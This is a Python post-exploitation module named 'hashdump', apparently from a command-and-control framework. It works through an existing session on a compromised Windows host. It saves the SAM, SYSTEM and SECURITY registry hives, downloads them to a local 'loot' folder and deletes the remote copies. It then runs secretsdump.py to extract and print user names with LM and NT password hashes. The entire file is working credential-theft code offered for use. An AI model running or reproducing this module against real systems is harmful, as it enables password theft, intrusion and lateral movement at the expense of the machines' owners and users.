import os
import subprocess
from core.module_base import ModuleBase
from core import session_manager, shell
from colorama import init, Fore, Style
import re

brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"

class HashdumpModule(ModuleBase):
    def __init__(self):
        super().__init__()
        self.name = "hashdump"
        self.description = (
            "Save SAM/SYSTEM/SECURITY hives remotely, download them, "
            "and run secretsdump.py locally"
        )
        self.options = {
            "session": {
                "description": "Target session ID or alias",
                "required": True,
                "value": ""
            },
            "output_dir": {
                "description": "Local directory to store hives and results",
                "required": True,
                "value": "./loot"
            },
            "secretsdump": {
                "description": "Path to local secretsdump.py",
                "required": False,
                "value": "secretsdump.py"
            }
        }

    def run(self):
        sid = session_manager.resolve_sid(self.options["session"]["value"])
        if not sid or sid not in session_manager.sessions:
            print(brightred + "[!] Invalid session")
            return

        session = session_manager.sessions[sid]
        os_type = session.metadata.get("os", "").lower()
        if "windows" not in os_type:
            print(brightred + "[!] This module only works on Windows targets")
            return

        remote_tmp = "$Env:Temp\\"
        remote_system = f"{remote_tmp}SYSTEM.hive"
        remote_sam = f"{remote_tmp}SAM.hive"
        remote_security = f"{remote_tmp}SECURITY.hive"

        print(brightyellow + f"[*] Saving hives on {sid}…")
        cmds = [
            f"reg save HKLM\\SYSTEM   {remote_system}   /y",
            f"reg save HKLM\\SAM      {remote_sam}      /y",
            f"reg save HKLM\\SECURITY {remote_security} /y"
        ]
        for c in cmds:
            if session_manager.is_http_session(sid):
                out = shell.run_command_http(sid, c)
            else:
                out = shell.run_command_tcp(sid, c, timeout=2)
            # ignore output, assume success c
        print(brightgreen + "[+] Hives saved remotely")

        # prepare local directory
        outdir = os.path.abspath(self.options["output_dir"]["value"])
        os.makedirs(outdir, exist_ok=True)
        local_system = os.path.join(outdir, f"{sid}_SYSTEM.hive")
        local_sam    = os.path.join(outdir, f"{sid}_SAM.hive")
        local_security = os.path.join(outdir, f"{sid}_SECURITY.hive")

        print(brightyellow + "[*] Downloading hives…")
        # download each
        if session_manager.is_http_session(sid):
            shell.download_file_http(sid, remote_system, local_system)
            shell.download_file_http(sid, remote_sam,      local_sam)
            shell.download_file_http(sid, remote_security, local_security)
        else:
            shell.download_file_tcp(sid, remote_system, local_system)
            shell.download_file_tcp(sid, remote_sam,      local_sam)
            shell.download_file_tcp(sid, remote_security, local_security)
        print(brightgreen + f"[+] Hives saved to {outdir}")

        print(brightyellow + "[*] Cleaning up remote hives…")
        cleanup_cmd = [f"del {remote_system}", f"del {remote_sam}", f"del {remote_security}"]
        for c in cleanup_cmd:
            if session_manager.is_http_session(sid):
                shell.run_command_http(sid, c)

            else:
                shell.run_command_tcp(sid, c, timeout=0.5)

        # run secretsdump locally
        secretsdump = self.options["secretsdump"]["value"]
        print(brightyellow + "[*] Running secretsdump.py locally…")
        args = [
        secretsdump,
        "LOCAL",
        "-system", local_system,
        "-sam", local_sam,
        "-security", local_security,
    ]

        try:
            proc = subprocess.run(args,
                                  stdout=subprocess.PIPE,
                                  stderr=subprocess.PIPE,
                                  text=True,
                                  check=False)

            if not proc.stderr:
                print(brightblue + "\n=== secretsdump.py output ===\n")
                pattern = re.compile(r'^[^*].+:[0-9]+:[0-9a-f]{32}:[0-9a-f]{32}')
                for line in proc.stdout.splitlines():
                    m = pattern.match(line)
                    if m:
                        # if you also want just user:uid:lm:nt,
                        # splitting on ':' is trivial:
                        parts = line.split(':')
                        user, uid, lm, nt = parts[0], parts[1], parts[2], parts[3]
                        print(brightgreen + f"{user}:{uid}:{lm}:{nt}")

            elif proc.stderr:
                print(brightred + "\n=== secretsdump.py errors ===\n")
                print(proc.stderr)

            else:
                print(brightred + f"[-] ERROR an unknown error has ocurred.")

        except FileNotFoundError:
            print(brightred + "[!] secretsdump.py not found; check your path option")
